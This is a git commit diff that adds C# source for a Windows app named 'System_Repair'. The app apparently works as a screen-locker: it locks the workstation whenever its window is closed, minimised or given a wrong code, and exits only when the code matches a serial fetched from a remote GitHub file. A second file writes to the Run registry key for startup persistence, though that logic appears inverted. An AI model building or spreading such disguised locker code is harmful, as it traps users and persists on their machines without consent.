fbae26257553f0618a0b7e2df249f484a7af71fd
lab_services_student <lab_services_student@ML-RefVm-631348>
2022-10-03 09:31:22 +0200

    Add project files.

---
+++ System_Repair/MainWindow.xaml.cs
@@ -0,0 +1,80 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Windows;
+
+namespace System_Repair
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        public MainWindow()
+        {
+            InitializeComponent();
+
+
+            frmStartup frmStartup = new frmStartup();
+
+        }
+
+
+
+        private void Button_Click(object sender, RoutedEventArgs e)
+        {
+
+            if (serial_code.Text.Equals(getSerial()))
+            {
+
+                System.Environment.Exit(1);
+
+            }
+            else
+            {
+
+                LockWorkStation();
+
+            }
+
+
+        }
+
+        [DllImport("user32.dll")]
+        public static extern bool LockWorkStation();
+
+
+        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        {
+            LockWorkStation();
+        }
+
+        private void Window_StateChanged(object sender, EventArgs e)
+        {
+            LockWorkStation();
+        }
+
+        private string getSerial()
+        {
+
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("https://raw.githubusercontent.com/mngz47/System_Repair/main/Serial.txt");
+            // access req.Headers to get/set header values before calling GetResponse. 
+            // req.CookieContainer allows you access cookies.
+
+            var response = req.GetResponse();
+            string webcontent;
+            using (var strm = new StreamReader(response.GetResponseStream()))
+            {
+                webcontent = strm.ReadToEnd();
+            }
+
+            return webcontent;
+        }
+
+        private void TextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
+        {
+
+        }
+    }
+}
---
+++ System_Repair/frmStartup.cs
@@ -0,0 +1,33 @@
+﻿using Microsoft.Win32;
+
+
+namespace System_Repair
+{
+    public partial class frmStartup : MainWindow
+    {
+        // The path to the key where Windows looks for startup applications
+        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+        string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
+
+
+        public frmStartup()
+        {
+            InitializeComponent();
+            // Check to see the current state (running at startup or not)
+            if (rkApp.GetValue("System_Repair") == null)
+            {
+                // The value doesn't exist, the application is not set to run at startup
+               
+
+                rkApp.DeleteValue("System_Repair", false);
+            }
+            else
+            {
+                // The value exists, the application is set to run at startup
+             
+                rkApp.SetValue("System_Repair", path);
+            }
+        }
+    }
+}
